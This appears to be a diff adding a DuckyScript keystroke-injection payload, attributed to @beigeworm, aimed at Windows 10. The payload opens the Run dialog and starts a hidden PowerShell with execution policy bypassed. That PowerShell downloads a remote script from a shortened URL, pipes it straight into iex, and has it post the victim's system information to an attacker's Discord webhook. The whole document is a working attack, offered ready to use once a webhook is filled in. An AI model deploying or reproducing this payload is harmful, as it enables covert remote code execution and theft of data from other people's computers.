@@ -1,0 +1,19 @@
+
+REM Title: beigeworm's system information to discord webhook 
+REM Author: @beigeworm
+REM Description: This script gathers system information and posts to a discord webhook address with the results.
+REM Target: Windows 10
+
+REM *SETUP*
+REM replace DISCORD_WEBHOOK_HERE with your Discord Webhook.
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $dc='DISCORD_WEBHOOK_HERE'; irm https://is.gd/bw_info_to_dc | iex
+ENTER
+
